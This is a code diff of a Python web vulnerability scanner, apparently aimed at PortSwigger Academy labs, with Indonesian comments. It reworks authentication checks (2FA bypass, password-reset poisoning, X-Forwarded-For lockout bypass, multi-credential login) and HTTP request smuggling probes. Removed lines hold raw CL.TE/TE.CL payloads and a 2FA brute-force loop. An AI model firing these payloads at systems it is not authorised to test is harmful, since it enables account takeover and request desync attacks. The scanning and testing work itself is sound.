-                    if t1!=t2 or ('incorrect' in t1) != ('incorrect' in t2):
-                        self._auth_mark(225, action, f"Brute-force via perubahan password terindikasi terverifikasi (perbedaan respons password saat ini) di {action}.", "auth_bf_password_change")
-
-        # 226 Broken brute-force protection, multiple credentials per request (JSON array)
-        if 226 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 226 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login']) or 'username'
-                pfield = pick(fields, ['password','pass','pwd']) or 'password'
-                payload = json.dumps({ufield:'carlos', pfield:['123456','password','qwerty', token]})
-                try:
-                    r = self._request('POST', action, data=payload, headers={'Content-Type':'application/json'}, allow_redirects=False)
-                except Exception:
+                login_resp = self._auth_submit(
+                    action, method, fields, page_url,
+                    {user_field: test_user, pass_field: test_password},
+                )
+                if login_resp.error:
                     continue
-                txt=(getattr(r,'text','') or '').lower()
-                if getattr(r,'status',0) in (200,302) and ('logout' in txt or 'my account' in txt or '"success"' in txt):
-                    self._auth_mark(226, action, f"Proteksi brute-force rusak (multiple credentials per request) terverifikasi di {action}.", "auth_bf_multiple_creds")
 
-        # 227 2FA bypass using a brute-force attack (indikasi: endpoint verifikasi tidak mengunci percobaan kode)
-        if 227 not in self._confirmed and self._within_budget():
-            for pg in pages[:25]:
-                u=(getattr(pg,'url','') or '')
-                if '2fa' not in u.lower() and 'verify' not in u.lower(): continue
-                for f in getattr(pg,'forms',[])[:6]:
-                    form_fields = self._auth_form_fields(f)
-                    names = list(form_fields)
-                    codef = None
-                    for n in names:
-                        if n and ('code' in n.lower() or 'otp' in n.lower() or 'mfa' in n.lower()): codef=n; break
-                    if not codef: continue
-                    action=getattr(f,'action','') or u
-                    last=None
-                    for i in range(6):
-                        try: last=self._request('POST', action, data={codef: f"{i:04d}"}, allow_redirects=False)
-                        except Exception: pass
-                    txt=(getattr(last,'text','') or '').lower() if last else ''
-                    # conservative: no lockout/rate-limit signal after multiple attempts
-                    if last and 'too many' not in txt and 'locked' not in txt and getattr(last,'status',0) in (200,302,400,401):
-                        self._auth_mark(227, action, f"Endpoint 2FA tanpa penguncian/rate-limit jelas setelah percobaan berulang terindikasi di {action}.", "auth_2fa_bruteforce")
+                login_location = self._auth_location(login_resp)
+                challenge_url = ""
+                if login_location and self._auth_has_2fa(login_location):
+                    challenge_url = urljoin(action, login_location)
+                challenge_resp = login_resp
+                if challenge_url and self._same_origin(challenge_url):
+                    next_resp = self._request("GET", challenge_url, allow_redirects=True)
+                    if not next_resp.error and next_resp.text:
+                        challenge_resp = next_resp
+
+                challenge_body = challenge_resp.text or ""
+                has_challenge = self._auth_has_2fa(challenge_body, self._auth_location(login_resp))
+                if not has_challenge:
+                    continue
+
+                # Simple bypass: sesi tahap pertama tidak boleh membuka endpoint akun.
+                for path in self._auth_account_paths(pages):
+                    if not self._within_budget() or 215 in self._confirmed:
+                        break
+                    account_url = urljoin(origin + "/", path.lstrip("/"))
+                    account_resp = self._request("GET", account_url, allow_redirects=False)
+                    if self._auth_is_account_page(account_resp):
+                        self._auth_mark(
+                            215, account_url,
+                            f"Sesi setelah kredensial tahap pertama (sebelum OTP) dapat membuka "
+                            f"halaman akun {account_url}; challenge 2FA masih aktif.",
+                            "auth_2fa_simple_bypass",
+                        )
+                        break
+
+                # Flawed verification logic: satu kode invalid tidak boleh menghasilkan sesi akun.
+                challenge_url = challenge_resp.url or challenge_url or login_resp.url or page_url
+                challenge_forms = self._parse_forms(
+                    challenge_url, BeautifulSoup(challenge_body, "html.parser")
+                )
+                for otp_form in challenge_forms[:4]:
+                    otp_fields = self._auth_form_fields(otp_form)
+                    code_field = self._auth_pick(
+                        otp_fields, ("code", "otp", "mfa", "verification", "token")
+                    )
+                    if not code_field:
+                        continue
+                    otp_action = urljoin(challenge_url, otp_form.action or challenge_url)
+                    otp_result = self._auth_submit(
+                        otp_action, otp_form.method, otp_fields, challenge_url,
+                        {code_field: "000000"},
+                    )
+                    if self._auth_is_account_page(otp_result):
+                        self._auth_mark(
+                            221, otp_action,
+                            f"Langkah 2FA menerima kode uji invalid 000000 dan mengembalikan "
+                            f"konten akun terautentikasi (HTTP {otp_result.status}).",
+                            "auth_2fa_broken_logic",
+                        )
+                    break
+                break
+
+        # 216: reset tanpa token valid dapat mengubah password akun uji.
+        # Tidak dijalankan kecuali pemilik secara eksplisit mengizinkan perubahan state.
+        allow_state_changes = os.getenv("SATRIA_AUTH_ENABLE_STATE_CHANGES", "").lower() in {
+            "1", "true", "yes", "on"
+        }
+        if allow_state_changes and test_user and reset_forms and self._within_budget():
+            for action, method, fields, page_url in reset_forms:
+                if not self._within_budget() or 216 in self._confirmed:
+                    break
+                pass_field = self._auth_pick(fields, ("new-password", "new_password", "password", "pass"))
+                user_field = self._auth_pick(fields, ("username", "user", "email", "login"))
+                if not pass_field:
+                    continue
+                test_new_password = os.getenv("SATRIA_AUTH_TEST_NEW_PASSWORD") or ""
+                if not test_new_password:
+                    self._scan_progress_event(
+                        "Uji reset logic dilewati: SATRIA_AUTH_TEST_NEW_PASSWORD belum disediakan."
+                    )
+                    break
+                changes = {pass_field: test_new_password}
+                if user_field:
+                    changes[user_field] = test_user
+                for name in fields:
+                    if re.search(r"(token|code|key)", name, re.I):
+                        changes[name] = "SATRIA-INVALID-RESET-TOKEN"
+                reset_resp = self._auth_submit(
+                    action, method, fields, page_url, changes,
+                )
+                text_low = (reset_resp.text or "").lower()
+                if (
+                    reset_resp.status in (200, 302, 303)
+                    and re.search(r"(password (?:has been )?(?:changed|updated|reset)|successfully reset)", text_low)
+                    and not re.search(r"(invalid|expired|incorrect|error|failed)", text_low)
+                ):
+                    self._auth_mark(
+                        216, action,
+                        "Form reset password menerima token invalid dan menyatakan password akun uji berubah.",
+                        "auth_password_reset_broken_logic",
+                    )
+
+        # 224: reset poisoning memicu email hanya ke alamat uji yang diberikan pengguna.
+        allow_reset_test = os.getenv("SATRIA_AUTH_ENABLE_RESET_TESTS", "").lower() in {
+            "1", "true", "yes", "on"
+        }
+        test_email = (os.getenv("SATRIA_AUTH_TEST_EMAIL") or "").strip()
+        if allow_reset_test and test_email and reset_forms and self._within_budget():
+            evil_host = "satria-" + uuid.uuid4().hex[:10] + ".example.invalid"
+            for action, method, fields, page_url in reset_forms:
+                if not self._within_budget() or 224 in self._confirmed:
+                    break
+                email_field = self._auth_pick(fields, ("email", "username", "user", "login"))
+                if not email_field:
+                    continue
+                reset_resp = self._auth_submit(
+                    action, method, fields, page_url,
+                    {email_field: test_email},
+                    headers={"X-Forwarded-Host": evil_host, "X-Host": evil_host},
+                )
+                evidence_text = (reset_resp.text or "") + " " + self._auth_location(reset_resp)
+                poisoned_link = re.search(
+                    r"https?://" + re.escape(evil_host) + r"(?::\d+)?(?:[/?:#][^\s<>]*)?",
+                    evidence_text, re.I,
+                )
+                if poisoned_link and re.search(
+                    r"(reset|password|token)", poisoned_link.group(0), re.I
+                ):
+                    self._auth_mark(
+                        224, action,
+                        f"Host poisoning marker {evil_host} muncul pada respons/link alur reset "
+                        f"yang dikirim ke alamat uji.",
+                        "auth_password_reset_poisoning",
+                    )
+
+        # Uji lockout berpotensi mengunci akun. Hanya aktif dengan akun uji dan
+        # opt-in eksplisit SATRIA_AUTH_ENABLE_LOCKOUT_TESTS=1.
+        allow_lockout = os.getenv("SATRIA_AUTH_ENABLE_LOCKOUT_TESTS", "").lower() in {
+            "1", "true", "yes", "on"
+        }
+        if allow_lockout and test_user and login_forms and self._within_budget():
+            for action, method, fields, page_url in login_forms[:2]:
+                if not self._within_budget():
+                    break
+                user_field = self._auth_pick(
+                    fields, ("username", "user", "email", "login", "identifier", "account")
+                )
+                pass_field = self._auth_pick(fields, ("password", "passwd", "pass", "pwd", "secret"))
+                if not user_field or not pass_field or method.upper() != "POST":
+                    continue
+                blocked = False
+                for attempt in range(4):
+                    result = self._auth_submit(
+                        action, method, fields, page_url,
+                        {user_field: test_user, pass_field: f"SATRIA-Wrong-{token}-{attempt}"},
+                    )
+                    body = (result.text or "").lower()
+                    if result.status == 429 or re.search(r"(too many|temporarily locked|account locked|try again later)", body):
+                        blocked = True
+                        break
+                if blocked:
+                    # Account-lock enumeration control: compare a random identity.
+                    random_result = self._auth_submit(
+                        action, method, fields, page_url,
+                        {user_field: random_user, pass_field: invalid_password},
+                    )
+                    random_body = (random_result.text or "").lower()
+                    if not (
+                        random_result.status == 429
+                        or re.search(r"(too many|temporarily locked|account locked|try again later)", random_body)
+                    ):
+                        self._auth_mark(
+                            220, action,
+                            "Akun uji terkena account-lock setelah percobaan invalid, sedangkan "
+                            "username acak tidak; perbedaan lockout membocorkan keberadaan akun.",
+                            "auth_username_enumeration_account_lock",
+                        )
+                    # IP-block bypass: ganti X-Forwarded-For setelah limit tercapai.
+                    spoofed_ip = "198.51.100." + str(10 + (int(uuid.uuid4().hex[:2], 16) % 200))
+                    retry = self._auth_submit(
+                        action, method, fields, page_url,
+                        {user_field: test_user, pass_field: invalid_password},
+                        headers={"X-Forwarded-For": spoofed_ip, "X-Real-IP": spoofed_ip},
+                    )
+                    retry_body = (retry.text or "").lower()
+                    if retry.status != 429 and not re.search(
+                        r"(too many|temporarily locked|account locked|try again later)", retry_body
+                    ):
+                        self._auth_mark(
+                            219, action,
+                            f"Proteksi IP memblokir percobaan awal, tetapi menerima percobaan berikut "
+                            f"setelah X-Forwarded-For diganti ke {spoofed_ip}.",
+                            "auth_broken_bruteforce_ip_block",
+                        )
+                break
+
+        # Pemeriksaan 226/227 memerlukan daftar kredensial atau kode yang memang
+        # disediakan pemilik untuk akun uji; tidak ada wordlist/OTP brute force default.
+        supplied_passwords = [
+            x.strip() for x in re.split(r"[,;\n]", os.getenv("SATRIA_AUTH_TEST_PASSWORDS", ""))
+            if x.strip()
+        ][:20]
+        if allow_lockout and test_user and supplied_passwords and enum_candidate and self._within_budget():
+            action, method, fields, page_url = enum_candidate
+            user_field = self._auth_pick(fields, ("username", "user", "email", "login", "identifier", "account"))
+            pass_field = self._auth_pick(fields, ("password", "passwd", "pass", "pwd", "secret"))
+            if user_field and pass_field:
+                page_resp = self._request("GET", page_url, allow_redirects=True)
+                fresh_fields = fields
+                if not page_resp.error and page_resp.text:
+                    parsed_forms = self._parse_forms(page_resp.url or page_url, BeautifulSoup(page_resp.text, "html.parser"))
+                    matching = next((f for f in parsed_forms if self._same_origin(f.action) and
+                                     (urlparse(f.action).path == urlparse(action).path)), None)
+                    if matching:
+                        fresh_fields = self._auth_form_fields(matching)
+                payload = {
+                    n: item.get("value", "") for n, item in fresh_fields.items()
+                    if item.get("type") not in {"submit", "button", "reset", "file", "image", "checkbox", "radio"}
+                }
+                payload[user_field] = test_user
+                payload[pass_field] = supplied_passwords
+                try:
+                    multi_resp = self._request(
+                        "POST", action, data=json.dumps(payload),
+                        headers={"Content-Type": "application/json", "Referer": page_url,
+                                 "Origin": origin, "Accept": "text/html,application/json"},
+                        allow_redirects=False,
+                    )
+                except Exception:
+                    multi_resp = None
+                if multi_resp and self._auth_is_account_page(multi_resp):
+                    self._auth_mark(
+                        226, action,
+                        f"Endpoint login menerima array {len(supplied_passwords)} password kandidat "
+                        f"dalam satu request JSON dan menghasilkan konten akun terautentikasi.",
+                        "auth_multiple_credentials_per_request",
+                    )
+
+        self._scan_progress_event(
+            "Authentication selesai; pengujian yang memerlukan akun, inbox, atau perubahan state "
+            "dilewati kecuali variabel SATRIA_AUTH_TEST_* dan opt-in terkait disediakan."
+        )
 
 
     # ======================== HTTP Request Smuggling (91-112) ========================
-    # Deteksi berbasis framing HTTP/1.1 mentah: dua request dikirim pada SATU koneksi
-    # (pipelining) sehingga desync teramati langsung, bukan sekadar dugaan dari
-    # perubahan status. Konfirmasi wajib diulang dan dibandingkan dengan baseline.
 
     def _smug_target(self) -> tuple[str, int, str, str]:
-        pu = urlparse(self.target_url)
-        scheme = (pu.scheme or "http").lower()
-        host = pu.hostname or ""
-        port = pu.port or (443 if scheme == "https" else 80)
-        path = pu.path or "/"
-        if pu.query:
-            path += "?" + pu.query
+        parsed = urlparse(self.target_url)
+        scheme = (parsed.scheme or "http").lower()
+        host = parsed.hostname or ""
+        port = parsed.port or (443 if scheme == "https" else 80)
+        path = parsed.path or "/"
+        if parsed.query:
+            path += "?" + parsed.query
         return scheme, port, host, path
 
     def _smug_connect(self, timeout: float | None = None):
-        import socket, ssl as _ssl
+        import socket
+        import ssl as _ssl
+
         scheme, port, host, _ = self._smug_target()
         if not host:
             return None
-        t = timeout if timeout is not None else max(3.0, float(getattr(self, "timeout", 8.0) or 8.0))
+        conn_timeout = timeout if timeout is not None else max(
+            3.0, float(getattr(self, "timeout", 8.0) or 8.0)
+        )
         try:
-            s = socket.create_connection((host, port), timeout=t)
+            sock = socket.create_connection((host, port), timeout=conn_timeout)
+            sock.settimeout(conn_timeout)
         except Exception:
             return None
-        try:
-            s.settimeout(t)
-        except Exception:
-            pass
         if scheme == "https":
             try:
-                ctx = _ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = _ssl.CERT_NONE
-                # Raw scanner constructs HTTP/1.1 framing; explicitly negotiate HTTP/1.1.
-                try:
-                    ctx.set_alpn_protocols(["http/1.1"])
-                except Exception:
-                    pass
-                s = ctx.wrap_socket(s, server_hostname=host)
+                context = _ssl.create_default_context()
+                context.set_alpn_protocols(["http/1.1"])
+                sock = context.wrap_socket(sock, server_hostname=host)
             except Exception:
                 try:
-                    s.close()
+                    sock.close()
                 except Exception:
                     pass
                 return None
-        return s
+        return sock
 
     @staticmethod
     def _smug_dechunk(data: bytes) -> tuple[bytes | None, int]:
-        """Dekode satu body chunked. Kembalikan (body, byte_terpakai) atau (None, 0)."""
-        out = bytearray()
-        pos = 0
+        output = bytearray()
+        position = 0
         while True:
-            nl = data.find(b"\r\n", pos)
-            if nl < 0:
+            newline = data.find(b"\r\n", position)
+            if newline < 0:
                 return None, 0
             try:
-                size = int(data[pos:nl].split(b";")[0].strip() or b"0", 16)
+                size = int(data[position:newline].split(b";")[0].strip() or b"0", 16)
             except ValueError:
                 return None, 0
-            pos = nl + 2
+            position = newline + 2
             if size == 0:
-                end = data.find(b"\r\n", pos)
+                end = data.find(b"\r\n", position)
                 if end < 0:
                     return None, 0
-                return bytes(out), end + 2
-            if len(data) < pos + size + 2:
+                return bytes(output), end + 2
+            if len(data) < position + size + 2:
                 return None, 0
-            out += data[pos:pos + size]
-            pos += size + 2
+            output.extend(data[position:position + size])
+            position += size + 2
 
     def _smug_parse_responses(self, raw: bytes) -> list[dict[str, Any]]:
-        """Parse satu atau lebih respons HTTP/1.1 berurutan (Content-Length/chunked)."""
-        out: list[dict[str, Any]] = []
+        responses: list[dict[str, Any]] = []
         data = raw or b""
         while data:
-            idx = data.find(b"\r\n\r\n")
-            if idx < 0:
+            boundary = data.find(b"\r\n\r\n")
+            if boundary < 0:
                 break
-            head, rest = data[:idx], data[idx + 4:]
+            head, rest = data[:boundary], data[boundary + 4:]
             lines = head.split(b"\r\n")
             if not lines:
                 break
-            m = re.match(br"HTTP/\d(?:\.\d)?\s+(\d{3})", lines[0])
-            if not m:
-                # sisa request yang tidak valid (mis. "GGET ...") -> bukan respons.
+            match = re.match(br"HTTP/\d(?:\.\d)?\s+(\d{3})", lines[0])
+            if not match:
                 break
-            status = int(m.group(1))
+            status = int(match.group(1))
             headers: dict[str, str] = {}
             for line in lines[1:]:
                 if b":" in line:
-                    k, v = line.split(b":", 1)
-                    headers[k.decode("latin-1", "ignore").strip().lower()] = v.decode("latin-1", "ignore").strip()
-            body = b""
+                    key, value = line.split(b":", 1)
+                    headers[key.decode("latin-1", "ignore").strip().lower()] = (
+                        value.decode("latin-1", "ignore").strip()
+                    )
             if 100 <= status < 200 and status != 101:
-                # Interim response (mis. 100 Continue) bukan respons request final;
-                # jangan dihitung sebagai slot respons kedua pada tes desync.
                 data = rest
                 continue
+            body = b""
             if status in (101, 204, 304):
                 data = b""
             elif "chunked" in headers.get("transfer-encoding", "").lower():
@@ -9149,480 +9609,272 @@ class SatriaBaruScanner:
                     break
                 data = rest[used:]
             elif headers.get("content-length", "").strip().isdigit():
-                n = int(headers["content-length"].strip())
-                body = rest[:n]
-                data = rest[n:]
+                size = int(headers["content-length"].strip())
+                if len(rest) < size:
+                    break
+                body = rest[:size]
+                data = rest[size:]
             else:
                 body = rest
                 data = b""
-            out.append({"status": status, "headers": headers,
-                        "body": body.decode("latin-1", "ignore")})
-        return out
+            responses.append({
+                "status": status,
+                "headers": headers,
+                "body": body.decode("latin-1", "ignore"),
+            })
+        return responses
 
-    def _smug_exchange(self, requests_list: list[bytes], expect: int = 2,
-                       timeout: float | None = None, pause: float = 0.0) -> tuple[list[dict[str, Any]], float, str | None]:
-        """Kirim beberapa request mentah pada satu koneksi, baca hingga `expect` respons."""
-        import socket, time as _time
-        t = timeout if timeout is not None else max(4.0, min(12.0, float(getattr(self, "timeout", 8.0) or 8.0)))
+    def _smug_build(
+        self, start_line: str, headers: list[tuple[str, str]], body: bytes = b""
+    ) -> bytes:
+        _, _, host, _ = self._smug_target()
+        lines = [start_line]
+        if not any(name.lower() == "host" for name, _ in headers):
+            lines.append(f"Host: {host}")
+        lines.extend(f"{name}: {value}" for name, value in headers)
+        lines.extend(["", ""])
+        return "\r\n".join(lines).encode("latin-1", "ignore") + (body or b"")
+
+    def _smug_get(self, path: str | None = None, close: bool = True) -> bytes:
+        _, _, host, default_path = self._smug_target()
+        request_path = path or default_path or "/"
+        headers = [
+            ("Host", host),
+            ("Connection", "close" if close else "keep-alive"),
+        ]
+        return self._smug_build(f"GET {request_path} HTTP/1.1", headers)
+
+    def _smug_mark(self, number: int, evidence: str, method_name: str):
+        point = Point(
+            key=f"smuggling-{number}", kind="endpoint",
+            label=f"HTTP request smuggling {self.target_url}",
+            url=self.target_url, name="request-smuggling",
+            original="", page_url=self.target_url, method="RAW", interest=8,
+        )
+        self._mark(number, point, evidence, method_name)
+
+
+
+
+    # Deteksi utama menggunakan timing probe CL.TE lalu TE.CL, sesuai urutan
+    # PortSwigger. Probe hanya mengirim satu request ambigu per koneksi dan
+    # menutup koneksi setelah batas waktu; tidak melakukan cache poisoning,
+    # menyisipkan request admin, atau memengaruhi antrean request pengguna lain.
+
+    def _smug_timing_trial(
+        self, raw: bytes, *, timeout: float = 4.0
+    ) -> tuple[float, int | None, str | None]:
+        import socket
+        import time as _time
+
         if not self._within_budget():
-            return [], 0.0, "budget_exhausted"
-        s = self._smug_connect(timeout=t)
-        if s is None:
-            return [], 0.0, "connect_failed"
-        start = _time.time()
-        buf = b""
-        responses: list[dict[str, Any]] = []
-        err: str | None = None
+            return 0.0, None, "budget_exhausted"
+        sock = self._smug_connect(timeout=timeout)
+        if sock is None:
+            return 0.0, None, "connect_failed"
+
+        start = _time.monotonic()
+        status: int | None = None
+        error: str | None = None
+        buffer = b""
         try:
-            for i, raw in enumerate(requests_list):
-                if not self._within_budget():
-                    err = "budget_exhausted"
-                    break
-                self.request_count += 1
-                self.stats["requests"] = self.request_count
-                request_line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
-                request_parts = request_line.split()
-                safe_request = " ".join(
-                    request_parts[:1] + ([request_parts[1].split("?", 1)[0]] if len(request_parts) > 1 else [])
-                )
-                self._scan_progress_event(f"KIRIM RAW HTTP/1 {safe_request}")
-                s.sendall(raw)
-                if pause and i == 0:
-                    _time.sleep(pause)
-            # Jangan half-close koneksi sebelum respons dibaca; request terakhir
-            # pada setiap probe memakai Connection: close untuk terminasi yang eksplisit.
-            deadline = start + t
-            while _time.time() < deadline:
+            self.request_count += 1
+            self.stats["requests"] = self.request_count
+            request_line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
+            parts = request_line.split()
+            safe_request = " ".join(
+                parts[:1] + ([parts[1].split("?", 1)[0]] if len(parts) > 1 else [])
+            )
+            self._scan_progress_event(f"KIRIM RAW HTTP/1 timing probe {safe_request}")
+            sock.sendall(raw)
+            deadline = start + timeout
+            while _time.monotonic() < deadline:
+                remaining = deadline - _time.monotonic()
+                sock.settimeout(max(0.1, min(0.5, remaining)))
                 try:
-                    s.settimeout(max(0.5, min(3.0, deadline - _time.time())))
-                    chunk = s.recv(8192)
+                    chunk = sock.recv(8192)
                 except socket.timeout:
-                    break
-                except Exception:
+                    continue
+                except Exception as exc:
+                    error = f"{type(exc).__name__}: {str(exc)[:80]}"
                     break
                 if not chunk:
                     break
-                buf += chunk
-                responses = self._smug_parse_responses(buf)
-                if len(responses) >= expect:
+                buffer += chunk
+                parsed = self._smug_parse_responses(buffer)
+                if parsed:
+                    status = parsed[0].get("status")
                     break
+            elapsed = _time.monotonic() - start
+            if status is None and not error:
+                error = "no_response_before_timeout"
         except Exception as exc:
-            err = f"{type(exc).__name__}: {str(exc)[:100]}"
+            elapsed = _time.monotonic() - start
+            error = f"{type(exc).__name__}: {str(exc)[:100]}"
         finally:
             try:
-                s.close()
+                sock.close()
             except Exception:
                 pass
-        if not responses:
-            responses = self._smug_parse_responses(buf)
         self._scan_progress_event(
-            f"RAW HTTP/1 selesai: {len(responses)} respons diterima"
-            + (f"; {err}" if err else "")
+            f"RAW HTTP/1 timing selesai: status={status or 'none'}, "
+            f"{elapsed:.2f} dtk" + (f"; {error}" if error else "")
         )
-        return responses, _time.time() - start, err
+        return elapsed, status, error
 
-    def _smug_build(self, start_line: str, headers: list[tuple[str, str]], body: bytes = b"") -> bytes:
-        _, _, host, _ = self._smug_target()
-        lines = [start_line]
-        if not any(k.lower() == "host" for k, _ in headers):
-            lines.append(f"Host: {host}")
-        lines.extend(f"{k}: {v}" for k, v in headers)
-        lines.extend(["", ""])
-        return ("\r\n".join(lines)).encode("latin-1", "ignore") + (body or b"")
-
-    def _smug_get(self, path: str | None = None, close: bool = True) -> bytes:
-        _, _, host, dpath = self._smug_target()
-        p = path or dpath or "/"
-        headers = [("Host", host), ("Connection", "close" if close else "keep-alive")]
-        return self._smug_build(f"GET {p} HTTP/1.1", headers)
-
-    def _smug_te_frontend(self) -> bool:
-        """True bila ada lapisan yang benar-benar mem-parse Transfer-Encoding: chunked.
-
-        Bukti: chunk size tidak valid harus ditolak (400) oleh parser TE. Server yang
-        hanya memakai Content-Length akan mengabaikannya (200), sehingga probe TE.CL
-        tidak diklaim sebagai desync pada server semacam itu (anti false positive).
-        """
-        _, _, host, _ = self._smug_target()
-        raw = self._smug_build(
-            "POST / HTTP/1.1",
-            [("Host", host), ("Transfer-Encoding", "chunked"), ("Connection", "close")],
-            b"zz\r\nabc\r\n0\r\n\r\n")
-        res, _, _ = self._smug_exchange([raw], 1)
-        return bool(res) and res[0].get("status") == 400
-
-    def _smug_normal_status(self, path: str | None = None) -> tuple[int | None, str, float, str | None]:
-        res, elapsed, err = self._smug_exchange([self._smug_get(path, close=True)], 1)
-        if not res:
-            return None, "", elapsed, err
-        return res[0]["status"], res[0].get("body", ""), elapsed, err
-
-    def _smug_desync_once(self, smuggle: bytes, follow_path: str = "/") -> tuple[bool, str]:
-        """Bandingkan respons kedua pada koneksi yang sama dengan baseline independen."""
-        b_status, b_body, _, b_err = self._smug_normal_status(follow_path)
-        if b_status is None:
-            return False, ""
-        res, elapsed, err = self._smug_exchange([smuggle, self._smug_get(follow_path, close=True)], 2)
-        if not res or len(res) < 2:
-            return False, ""
-        second = res[1]
-        second_body = (second.get("body") or "")[:1200]
-        low = second_body.lower()
-        parser_error = (
-            second["status"] in (400, 405, 501)
-            and second["status"] != b_status
-            and bool(re.search(
-                r"unrecognized method|invalid method|method not allowed|gpost|gget|bad request",
-                low,
-                re.I,
-            ))
-        )
-        unique_404_path = bool(re.search(rb"/404-[A-Za-z0-9_-]+", smuggle))
-        not_found_differential = (
-            second["status"] == 404
-            and b_status != 404
-            and unique_404_path
-        )
-        if parser_error or not_found_differential:
-            signal = "parser rejection" if parser_error else "404 pada path smuggled yang unik"
-            return True, (
-                f"pipeline: baseline GET {follow_path} -> {b_status}, respons kedua setelah "
-                f"smuggle+follow -> {second['status']} ({signal}); "
-                f"{second_body[:100]!r}, {elapsed:.2f}s"
-                + (f", err={err}" if err else "")
-                + (f", baseline_err={b_err}" if b_err else "")
-            )
-        return False, ""
-
-    def _smug_desync(self, smuggle: bytes, follow_path: str = "/", trials: int = 2) -> tuple[bool, str]:
-        evidences: list[str] = []
-        for _ in range(max(1, trials)):
-            ok, ev = self._smug_desync_once(smuggle, follow_path)
-            if not ok:
-                return False, ""
-            evidences.append(ev)
-        return True, evidences[-1]
-
-    @staticmethod
-    def _smug_admin_text(text: str) -> bool:
-        low = (text or "").lower()
-        if "admin panel" in low or "admin interface" in low or "user management" in low:
-            return True
-        return ("admin" in low or "dashboard" in low) and ("user" in low or "delete" in low or "upgrade" in low)
-
-    def _smug_mark(self, num: int, ev: str, method_name: str):
-        point = Point(key=f"smuggling-{num}", kind="endpoint", label=f"HTTP request smuggling {self.target_url}",
-                      url=self.target_url, name="request-smuggling", original="", page_url=self.target_url,
-                      method="RAW", interest=8)
-        self._mark(num, point, ev, method_name)
+    def _smug_active_allowed(self) -> bool:
+        host = (urlparse(self.target_url).hostname or "").lower().rstrip(".")
+        academy_target = host.endswith(".web-security-academy.net")
+        explicit_opt_in = os.getenv("SATRIA_ENABLE_ACTIVE_SMUGGLING", "").lower() in {
+            "1", "true", "yes", "on"
+        }
+        return academy_target or explicit_opt_in
 
     def phase_smuggling(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi HTTP request smuggling (91-112) dengan pipelining koneksi tunggal.
+        """Uji CL.TE dan TE.CL berbasis timing dengan baseline berpasangan.
 
-        Lab 96, 98-101, 109-111 bergantung pada lalu lintas korban/HTTP2/TLS tunnelling
-        dan tidak dapat dibuktikan dari satu klien HTTP/1.1; lab tersebut dibiarkan
-        not_confirmed alih-alih diklaim tanpa bukti.
+        CL.TE diuji lebih dahulu. TE.CL hanya diuji bila CL.TE tidak terindikasi,
+        karena urutan sebaliknya dapat mengganggu pengguna lain pada sistem yang
+        sebenarnya rentan CL.TE. Konfirmasi hanya diberikan jika kedua probe
+        identik timeout sementara kedua baseline normal merespons cepat.
         """
         if not self.target_url or not self._within_budget():
             return
         scheme, port, host, path = self._smug_target()
         if not host:
             return
-        import time as _time
-        base_path = path if (path or "").startswith("/") else "/" + (path or "")
-        token = uuid.uuid4().hex[:8]
-
-        cluster_host = host
-        try:
-            err_page = self._request("GET", self.target_url, allow_redirects=True)
-        except Exception:
-            err_page = None
-        if err_page is not None and err_page.error:
+        if not self._smug_active_allowed():
+            self._scan_progress_event(
+                "Probe desync aktif dilewati pada target non-Academy; "
+                "set SATRIA_ENABLE_ACTIVE_SMUGGLING=1 hanya untuk sistem yang Anda kuasai."
+            )
             return
 
-        # ---------- 92/105: TE.CL ----------
-        tecl_seen = False
-        if 92 not in self._confirmed and self._within_budget() and self._smug_te_frontend():
-            # TE.CL canonical: front-end decodes the GPOST chunk, while a backend
-            # honoring Content-Length consumes only the three-byte chunk-size line.
-            chunked = "5\r\nGPOST\r\n0\r\n\r\n"
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "3"),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                chunked.encode())
-            ok, ev = self._smug_desync(smuggle, "/")
-            if ok:
-                tecl_seen = True
-                self._smug_mark(92, "TE.CL differential terkonfirmasi (dua percobaan): " + ev,
-                                "smuggling_te_cl_differential")
-                self._smug_mark(105, "Basic TE.CL terkonfirmasi dari bukti pipeline TE.CL: " + ev,
-                                "smuggling_basic_te_cl")
+        try:
+            timeout = float(os.getenv("SATRIA_SMUGGLING_TIMEOUT", "4.0"))
+        except (TypeError, ValueError):
+            timeout = 4.0
+        timeout = max(3.0, min(6.0, timeout))
+        request_path = path if (path or "").startswith("/") else "/" + (path or "")
+        token = uuid.uuid4().hex[:10]
 
-        # ---------- 91/104: CL.TE ----------
-        clte_seen = False
-        if 91 not in self._confirmed and self._within_budget():
-            bodies = ["0\r\n\r\nG", "0\r\n\r\nGET /404-smug HTTP/1.1\r\nX: y\r\n\r\n"]
-            for body in bodies:
-                if 91 in self._confirmed or not self._within_budget():
-                    break
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", str(len(body))),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                ok, ev = self._smug_desync(smuggle, "/")
-                if ok:
-                    clte_seen = True
-                    self._smug_mark(91, "CL.TE differential terkonfirmasi (dua percobaan): " + ev,
-                                    "smuggling_cl_te_differential")
-                    self._smug_mark(104, "Basic CL.TE terkonfirmasi dari bukti pipeline CL.TE: " + ev,
-                                    "smuggling_basic_cl_te")
-                    break
-
-        # ---------- 93/94: bypass kontrol front-end ----------
-        if 93 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            admin_paths = ["/admin"]
-            for pg in pages[:8]:
-                for link in getattr(pg, "links", [])[:40]:
-                    if "admin" in (link or "").lower() and self._same_origin(link) and link not in admin_paths:
-                        admin_paths.append(urlparse(link).path or "/admin")
-            for ap in admin_paths[:3]:
-                if 93 in self._confirmed or not self._within_budget():
-                    break
-                b_status, b_body, _, _ = self._smug_normal_status(ap)
-                smuggled = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
-                body = "0\r\n\r\n" + smuggled
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", "5"),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
